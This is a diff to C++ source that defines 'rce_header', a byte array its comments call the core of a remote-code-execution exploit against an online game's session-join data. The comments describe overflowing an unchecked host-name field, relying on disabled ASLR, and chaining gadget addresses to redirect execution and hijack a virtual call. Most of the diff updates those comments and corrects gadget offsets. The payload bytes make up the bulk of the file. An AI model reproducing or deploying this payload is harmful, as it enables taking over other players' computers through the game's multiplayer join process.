@@ -5,20 +5,26 @@
 #include <stdint.h>
 #include <vector>
 
-// Carefully constructed session join data, the core of the exploit.
+// Carefully constructed session join data, the core of the exploit. This entire data is stored in
+// the form of a size delimited entry list. 
 static const uint8_t rce_header[] = {
-	// First 0x30 bytes here is not related to the exploit. Appears to be used by the game to send 
-	// spawn map, coordinates and orientation to the player about to join the host's session.
-	// This is copied from real game data.
+	// First 0x30 bytes here is not related to the exploit. 
+	
+	// First entry: Type 2, Data size 0x1C. Appears to be used by the game to send spawn map ID, coordinates and 
+	// orientation to the player about to join the host's session. The specific bytes below are copied
+	// from real game data.
 	0x02, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x33, 0xAE, 0xC7, 0xC1, 0xC3,
 	0xC3, 0xF5, 0x5E, 0xC2, 0xA4, 0xD0, 0x8D, 0xC3, 0x7C, 0x60, 0xC1, 0xBD, 0xC0, 0x32, 0x0A, 0x03,
-	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
-
-	// Rest is the NRSSR data stored in a size delimited entry list.
-
-	0x01, 0x00, 0x00, 0x00, // An ID of some kind, prepends every entry
+	0x00, 0x00, 0x00, 0x00, 
 	
-	// Size of the packet. here this is set to the stack memory address of the data_buffer field 
+	// Second entry: Type 2, length 4. I'm not sure what this is used for.
+	0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
+
+	// Rest is the NRSSR data stored in its own size delimited entry.
+
+	0x01, 0x00, 0x00, 0x00, // Entry type/id field
+	
+	// Size of the entry. here this is set to the stack memory address of the data_buffer field 
 	// of the DLMemoryInputStream game object which will contain our packet. The exploit relies on the 
 	// fact that this data is processed by the game's meain thread and that ALSR is disabled, making 
 	// the memory address constant. 
@@ -54,7 +60,7 @@ static const uint8_t rce_header[] = {
 	0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 
 	0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
 
-	// Offset 0x40: 1404e5800 (this is where execution gets redirected. Sets up registers then calls offset 0x68)
+	// Offset 0x40: 1422be020 (first arbitrary code redirection, sets up registers then calls offset 0x68)
 	0x20, 0xE0, 0x2B, 0x42, 0x01, 0x00, 0x00, 0x00, 
 	
 	0x00, 0x00, 0x03, 0x04, 0x00, 0x01, 0x01, 0x01,
@@ -62,7 +68,7 @@ static const uint8_t rce_header[] = {
 	0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01,
 	0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 
 	
-	// 0x68: 140e40f00. This gadget does almost everything for us. It calls offset 0x18 to get a memcpy
+	// 0x68: 140e40f15. This gadget does almost everything for us. It calls offset 0x18 to get a memcpy
 	// destination pointer, copies our packet there and then calls the virtual function at offset 0x68 
 	// on static object at 144786998, which we now fully control because of the memcpy call.
 	0x15, 0x0F, 0xE4, 0x40, 0x01, 0x00, 0x00, 0x00,
@@ -70,7 +76,7 @@ static const uint8_t rce_header[] = {
 	// This final part is required to make this a valid NRSSR property list.
 	0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00
 
-	// Normal NRSSR data would then include the host's character name as a null terminated wide string 
+	// Normal NRSSR data would then include the host's Steam name as a null terminated wide string 
 	// followed by his Steam ID 64 as a uint64_t, a uint16_t indicating session data size and then 
 	// the session data which is simply the Steam lobby ID. However for the exploit we use the lack of 
 	// bounds checking on the host name to corrupt the stack and eventually modify the DLMemoryInputStream's
